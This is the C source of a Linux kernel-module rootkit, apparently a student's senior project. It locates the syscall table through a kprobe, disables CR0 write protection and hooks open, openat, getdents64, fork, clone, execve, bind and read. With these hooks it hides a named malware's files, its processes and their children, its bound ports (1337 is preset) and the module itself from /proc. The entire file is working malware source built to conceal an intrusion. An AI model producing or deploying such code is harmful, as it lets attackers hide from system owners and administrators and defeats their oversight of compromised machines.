#include <linux/init.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <asm/current.h>
#include <linux/fs.h>
#include <linux/prefetch.h>
#include <linux/fs_struct.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h>
#include "mount.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Noop Noop");
MODULE_DESCRIPTION("Senior Project");
MODULE_VERSION("0.1");

#define BASE_PROC 1
#define NET_PROC 2
#define MODULES_PROC 3

char * ROOTKIT_NAME = "rootkit";

// https://linux.die.net/man/2/getdents64
struct linux_dirent {
        long            d_ino;
        off_t           d_off;
        unsigned short  d_reclen;
        char            d_name[];
};

struct proc_fd {
        struct proc_fd * next;
        unsigned long pid;
        unsigned long fd;
        unsigned long type;
};

uint64_t __force_order; //from linux source write_cr0, forces serialization 
void ** syscall_table;
char * malware_name = MALWARE_NAME;
char * pid_map;
char * port_map;

struct proc_fd * proc_fd_head = NULL;

// previously saved function pointers
asmlinkage long (*original_sys_openat)(const struct pt_regs * regs);
asmlinkage long (*original_sys_open)(const struct pt_regs * regs);
asmlinkage long (*original_sys_getdents64)(const struct pt_regs * regs);
asmlinkage long (*original_sys_fork)(const struct pt_regs * regs);
asmlinkage long (*original_sys_clone)(const struct pt_regs * regs);
asmlinkage long (*original_sys_execve)(const struct pt_regs * regs);
asmlinkage long (*original_sys_bind)(const struct pt_regs * regs);
asmlinkage long (*original_sys_read)(const struct pt_regs * regs);

static char * get_full_path(char * path);
static int kern_getcwd(char * buff, unsigned long size);

asmlinkage long mal_sys_openat(const struct pt_regs * regs)
{
                char * file_name_buf = kmalloc(0x400, GFP_KERNEL);
                int ret = strncpy_from_user(file_name_buf, (const char *)regs->si, 0x400);
                if (ret > 0) {
                        if (strstr(file_name_buf, malware_name)) {
                                kfree(file_name_buf);
                                return -1;
                        }

                        char * full_path = get_full_path(file_name_buf);
                        if (!strcmp(full_path, "/proc")) {
                                // must add the returned fd to our list
                                long fd = original_sys_openat(regs);

                                struct proc_fd * ll_element = (struct proc_fd *)kmalloc(sizeof(struct proc_fd), GFP_KERNEL);
                                ll_element->pid = current->pid;
                                ll_element->fd = fd;
                                ll_element->type = BASE_PROC;
                                ll_element->next = proc_fd_head;

                                proc_fd_head = ll_element;
                                return fd;
                        } else if (!strcmp(full_path, "/proc/net/tcp")) {
                                long fd = original_sys_openat(regs);

                                struct proc_fd * ll_element = (struct proc_fd *)kmalloc(sizeof(struct proc_fd), GFP_KERNEL);
                                ll_element->pid = current->pid;
                                ll_element->fd = fd;
                                ll_element->type = NET_PROC;
                                ll_element->next = proc_fd_head;

                                proc_fd_head = ll_element;
                                return fd;
                        } else if (!strcmp(full_path, "/proc/modules")) {
                                long fd = original_sys_openat(regs);

                                struct proc_fd * ll_element = (struct proc_fd *)kmalloc(sizeof(struct proc_fd), GFP_KERNEL);
                                ll_element->pid = current->pid;
                                ll_element->fd = fd;
                                ll_element->type = MODULES_PROC;
                                ll_element->next = proc_fd_head;

                                proc_fd_head = ll_element;
                                return fd;
                        }
                }

                kfree(file_name_buf);
                return original_sys_openat(regs);
}


asmlinkage long mal_sys_open(const struct pt_regs * regs)
{
                char * file_name_buf = kmalloc(0x400, GFP_KERNEL);
                int ret = strncpy_from_user(file_name_buf, (const char *)regs->di, 0x400);
                if (ret > 0) {
                        if (strstr(file_name_buf, malware_name)) {
                                kfree(file_name_buf);
                                return -1;
                        }
                }

                kfree(file_name_buf);
                return original_sys_open(regs);
}


asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
{
        // check if file is included in getdents64 (ls source, readdir source)
        // first save the linux_dirent pointer
        void * dirent_ptr = regs->si;

        int fd = regs->di;
        int pid = current->pid;
        struct proc_fd * tmp = proc_fd_head;

        bool is_proc = false;
		int dir_type = 0;
        while (tmp) {
                if (tmp->fd == fd && tmp->pid == pid && (tmp->type == BASE_PROC)) {
                        is_proc = true;
						dir_type = tmp->type;
                        break;
                }
                tmp = tmp->next;
        }

        char * path_buff = kmalloc(0x400, GFP_KERNEL);
        kern_getcwd(path_buff, 0x400);

        long size = original_sys_getdents64(regs);

        if (size > 0){
                char * buffer = kmalloc(size+1, GFP_KERNEL);
                int copied_bytes = copy_from_user(buffer, dirent_ptr, size);
                if (copied_bytes > 0) {
                        return size;
                }

                // create a new buffer to copy into, in case there are bad files
                char * clean_buff = kmalloc(size+1, GFP_KERNEL);

                int curr_off = 0;
                int clean_off = 0;
                for (curr_off = 0; curr_off < size; ) {
                        struct linux_dirent * dpt = (struct linux_dirent *)(buffer+curr_off);

                        // it can be seen in the debug information that d_name starts with a character
                        // 0x04 indicates a directory
                        // 0x08 indicates a file
                        // This should not matter as we are trying to block a file, and 0x04 is not NULL 

                        if (strstr(dpt->d_name, malware_name)) {
                                // each call seeks file stream, so just return next
                                curr_off += dpt->d_reclen;
                                continue;
						}

                        if (is_proc) {
                                long file_pid = 0;
                                kstrtol(dpt->d_name+1, 10, &file_pid);

                                if (file_pid > 0) {
                                        if (pid_map[file_pid]) {
                                                curr_off += dpt->d_reclen;
                                                continue;
                                        }
                                }
                        }

                        memcpy(clean_buff+clean_off, buffer+curr_off, dpt->d_reclen);

                        clean_off += dpt->d_reclen;
                        curr_off += dpt->d_reclen;
                }

                copy_to_user(dirent_ptr, clean_buff, clean_off);
                kfree(buffer);
                kfree(clean_buff);
                return clean_off;
        }
        return size; 
}

// hooks to trace through all children of our malware
asmlinkage long mal_sys_clone(const struct pt_regs * regs)
{
        int pid = current->pid;
        if (pid_map[pid]) {
                int new_pid = original_sys_clone(regs);
                pid_map[new_pid] = 1;
                return new_pid;
        } else {
                return original_sys_clone(regs);
        }
}


asmlinkage long mal_sys_execve(const struct pt_regs * regs)
{
        char * name = kmalloc(0x400, GFP_KERNEL);
        strncpy_from_user(name, (char *)regs->di, 0x400);

        if (strstr(name, malware_name)) {
                int pid = current->pid;
                pid_map[pid] = 1;
        }

        kfree(name);

        return original_sys_execve(regs);
}


asmlinkage long mal_sys_fork(const struct pt_regs * regs)
{
        int pid = current->pid;
        int new_pid = original_sys_fork(regs);
        if (new_pid > 0 && pid_map[pid]) {
                pid_map[new_pid] = 1;
        }
        return new_pid;
}


asmlinkage long mal_sys_bind(const struct pt_regs * regs)
{
		int pid = current->pid;
		if (pid_map[pid]) {
				struct sockaddr * s = kmalloc(regs->dx, GFP_KERNEL);
				copy_from_user(s, regs->si, regs->dx);
				short port = ((short *)s->sa_data)[0];
				port_map[port] = 1;
				kfree(s);
		}
        return original_sys_bind(regs);
}

asmlinkage long mal_sys_read(const struct pt_regs * regs)
{
        int fd = regs->di;
        int pid = current->pid;
        struct proc_fd * tmp = proc_fd_head;

        bool is_proc = false;
		int fd_type = 0;
        while (tmp) {
                if (tmp->fd == fd && tmp->pid == pid && ((tmp->type == NET_PROC) || (tmp->type == MODULES_PROC))) {
                        is_proc = true;
						fd_type = tmp->type;
                        break;
                }
                tmp = tmp->next;
        }

        if (is_proc) {
                char * __user user_buff = regs->si;
                long ret = original_sys_read(regs);

                if (ret <= 0) {
                        return ret;
                }

                char * kern_buff = kmalloc(ret+1, GFP_KERNEL);
                copy_from_user(kern_buff, user_buff, ret);

                char * out_buff = kzalloc(ret+1, GFP_KERNEL);
                char * line = strsep(&kern_buff, "\n");

                while (line) {
                        // read through 2 colons
						if (fd_type == NET_PROC) {
								int i;
								bool first_found = false;
								for (i = 0; i < strlen(line); i++) {
										if (line[i] == ':' && first_found) {
												break;
										} else if (line[i] == ':') {
												first_found = true;
										}
								}

								if (i == strlen(line)) {
										strcat(out_buff, line);
										strcat(out_buff, "\n");
										line = strsep(&kern_buff, "\n");
										continue;
								}

								char * hex_port = line+i+1;
								hex_port[0x4] = '\0';
								long port_num = 0;
								kstrtol(hex_port, 0x10, &port_num);

								if (!port_map[port_num]) {
										hex_port[0x4] = ' ';
										strcat(out_buff, line);
										strcat(out_buff, "\n");
								}
						} else {
								if (!strstr(line, "rootkit")) {
										strcat(out_buff, line);
										strcat(out_buff, "\n");
								}
						}

                        line = strsep(&kern_buff, "\n");
                }

                long newlen = strlen(out_buff);
                copy_to_user(user_buff, out_buff, ret);
                return newlen;
        } 

        return original_sys_read(regs);
}


// The following code is from the linux source tree at fs/d_path.c
// I created a simple version of getcwd for kernel buffers by doing
// small patches on the standard getcwd code
static int prepend(char **buffer, int *buflen, const char *str, int namelen)
{
        *buflen -= namelen;
        if (*buflen < 0)
                return -ENAMETOOLONG;
        *buffer -= namelen;
        memcpy(*buffer, str, namelen);
        return 0;
}

static int prepend_name(char **buffer, int *buflen, const struct qstr *name)
{
        const char *dname = smp_load_acquire(&name->name); /* ^^^ */
        u32 dlen = READ_ONCE(name->len);
        char *p;

        *buflen -= dlen + 1;
        if (*buflen < 0)
                return -ENAMETOOLONG;
        p = *buffer -= dlen + 1;
        *p++ = '/';
        while (dlen--) {
                char c = *dname++;
                if (!c)
                        break;
                *p++ = c;
        }
        return 0;
}

static int prepend_path(const struct path *path,
                        const struct path *root,
                        char **buffer, int *buflen)
{
        struct dentry *dentry;
        struct vfsmount *vfsmnt;
        struct mount *mnt;
        int error = 0;
        unsigned seq, m_seq = 0;
        char *bptr;
        int blen;

        rcu_read_lock();
restart_mnt:
        read_seqbegin_or_lock(&mount_lock, &m_seq);
        seq = 0;
        rcu_read_lock();
restart:
        bptr = *buffer;
        blen = *buflen;
        error = 0;
        dentry = path->dentry;
        vfsmnt = path->mnt;
        mnt = real_mount(vfsmnt);
        read_seqbegin_or_lock(&rename_lock, &seq);
        while (dentry != root->dentry || vfsmnt != root->mnt) {
                struct dentry * parent;

                if (dentry == vfsmnt->mnt_root || IS_ROOT(dentry)) {
                        struct mount *parent = READ_ONCE(mnt->mnt_parent);
                        struct mnt_namespace *mnt_ns;

                        /* Escaped? */
                        if (dentry != vfsmnt->mnt_root) {
                                bptr = *buffer;
                                blen = *buflen;
                                error = 3;
                                break;
                        }
                        /* Global root? */
                        if (mnt != parent) {
                                dentry = READ_ONCE(mnt->mnt_mountpoint);
                                mnt = parent;
                                vfsmnt = &mnt->mnt;
                                continue;
                        }
                        mnt_ns = READ_ONCE(mnt->mnt_ns);
                        /* open-coded is_mounted() to use local mnt_ns */
                        if (!IS_ERR_OR_NULL(mnt_ns) && !is_anon_ns(mnt_ns))
                                error = 1;      // absolute root
                        else
                                error = 2;      // detached or not attached yet
                        break;
                }
                parent = dentry->d_parent;
                prefetch(parent);
                error = prepend_name(&bptr, &blen, &dentry->d_name);
                if (error)
                        break;

                dentry = parent;
        }
        if (!(seq & 1))
                rcu_read_unlock();
        if (need_seqretry(&rename_lock, seq)) {
                seq = 1;
                goto restart;
        }
        done_seqretry(&rename_lock, seq);

        if (!(m_seq & 1))
                rcu_read_unlock();
        if (need_seqretry(&mount_lock, m_seq)) {
                m_seq = 1;
                goto restart_mnt;
        }
        done_seqretry(&mount_lock, m_seq);

        if (error >= 0 && bptr == *buffer) {
                if (--blen < 0)
                        error = -ENAMETOOLONG;
                else
                        *--bptr = '/';
        }
        *buffer = bptr;
        *buflen = blen;
        return error;
}

static int prepend_unreachable(char **buffer, int *buflen)
{
        return prepend(buffer, buflen, "(unreachable)", 13);
}

static void get_fs_root_and_pwd_rcu(struct fs_struct *fs, struct path *root,
                                    struct path *pwd)
{
        unsigned seq;

        do {
                seq = read_seqcount_begin(&fs->seq);
                *root = fs->root;
                *pwd = fs->pwd;
        } while (read_seqcount_retry(&fs->seq, seq));
}

static int kern_getcwd(char * buf, unsigned long size)
{
        int error;
        struct path pwd, root;
        char *page = __getname();

        if (!page)
                return -ENOMEM;

        rcu_read_lock();
        get_fs_root_and_pwd_rcu(current->fs, &root, &pwd);

        error = -ENOENT;
        if (!d_unlinked(pwd.dentry)) {
                unsigned long len;
                char *cwd = page + PATH_MAX;
                int buflen = PATH_MAX;

                prepend(&cwd, &buflen, "\0", 1);
                error = prepend_path(&pwd, &root, &cwd, &buflen);
                rcu_read_unlock();

                if (error < 0)
                        goto out;

                /* Unreachable from current root */
                if (error > 0) {
                        error = prepend_unreachable(&cwd, &buflen);
                        if (error)
                                goto out;
                }

                error = -ERANGE;
                len = PATH_MAX + page - cwd;
                if (len <= size) {
                        error = len;
                        if (!memcpy(buf, cwd, len))
                                error = -EFAULT;
                }
        } else {
                rcu_read_unlock();
        }

out:
        __putname(page);
        return error;
}

static char * get_full_path(char * pathname)
{
        if (pathname[0] == '/') {
                return pathname;
        } else {
                char * cwd = kmalloc(0x400, GFP_KERNEL);
                kern_getcwd(cwd, 0x400);
                char * full_path = kmalloc(0x400, GFP_KERNEL);
                strcpy(full_path, cwd);
                strncat(full_path, pathname, 0x400);
                return full_path;
        }
}

/**
static void hide_task_struct(void)
{
                struct task_struct * task_iter;
                struct task_struct * next_task;
                struct task_struct * prev_task;

                for_each_process(task_iter) {
                                if (!strcmp(task_iter->comm, malware_name)) {
                                                prev_task = list_entry_rcu(task_iter->tasks.prev, struct task_struct, tasks);
                                                next_task = list_entry_rcu(task_iter->tasks.next, struct task_struct, tasks);
                                                list_add(&(prev_task->tasks), &(next_task->tasks));
                                                list_add_tail(&(next_task->tasks), &(prev_task->tasks));
                                                break;
                                }
                }
}**/


// https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411
static void write_cr0_pinned(uint64_t value)
{
                asm volatile("mov %0, %%cr0": "+r"(value), "+m"(__force_order));
}


static void patch_syscall(uint64_t index, void * function_ptr)
{
                unsigned long tmp_cr0 = read_cr0();
                clear_bit(16, &tmp_cr0);
                write_cr0_pinned(tmp_cr0);
                syscall_table[index] = function_ptr;
                tmp_cr0 = read_cr0();
                set_bit(16, &tmp_cr0);
                write_cr0_pinned(tmp_cr0);
                return;
}

// lookup alternative for kallsyms_lookup_name
// https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c
static void ** syscall_table_lookup(void)
{
        struct kprobe k = {
                .symbol_name = "sys_call_table"
        };

        register_kprobe(&k);

        return (void **)(k.addr);
}

static int __init rootkit_init(void)
{
                pid_map = (char *)kmalloc(sizeof(char) * 32768, GFP_KERNEL);
                //pid_map[41548] = 1;
                port_map = (char *)kmalloc(sizeof(char) * 65537, GFP_KERNEL);
                port_map[1337] = 1;

                syscall_table = syscall_table_lookup();

                original_sys_open = syscall_table[__NR_open];
                original_sys_openat = syscall_table[__NR_openat];
                original_sys_getdents64 = syscall_table[__NR_getdents64];
                original_sys_clone = syscall_table[__NR_clone];
                original_sys_execve = syscall_table[__NR_execve];
                original_sys_fork = syscall_table[__NR_fork];
                original_sys_bind = syscall_table[__NR_bind];
                original_sys_read = syscall_table[__NR_read];

                patch_syscall(__NR_open, mal_sys_open);
                patch_syscall(__NR_openat, mal_sys_openat);
                patch_syscall(__NR_getdents64, mal_sys_getdents64);
                patch_syscall(__NR_clone, mal_sys_clone);
                patch_syscall(__NR_fork, mal_sys_fork);
                patch_syscall(__NR_execve, mal_sys_execve);
                patch_syscall(__NR_bind, mal_sys_bind);
                patch_syscall(__NR_read, mal_sys_read);

                // TODO: find malware process and remove from process list
                // hide_task_struct();
                return 0;
}

static void __exit rootkit_exit(void)
{
                // Here, install exit procedures for the rootkit
                // repair syscall table
                patch_syscall(__NR_openat, original_sys_openat);
                patch_syscall(__NR_open, original_sys_open);
                patch_syscall(__NR_getdents64, original_sys_getdents64);
                patch_syscall(__NR_clone, original_sys_clone);
                patch_syscall(__NR_fork, original_sys_fork);
                patch_syscall(__NR_execve, original_sys_execve);
                patch_syscall(__NR_bind, original_sys_bind);
                patch_syscall(__NR_read, original_sys_read);
                return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
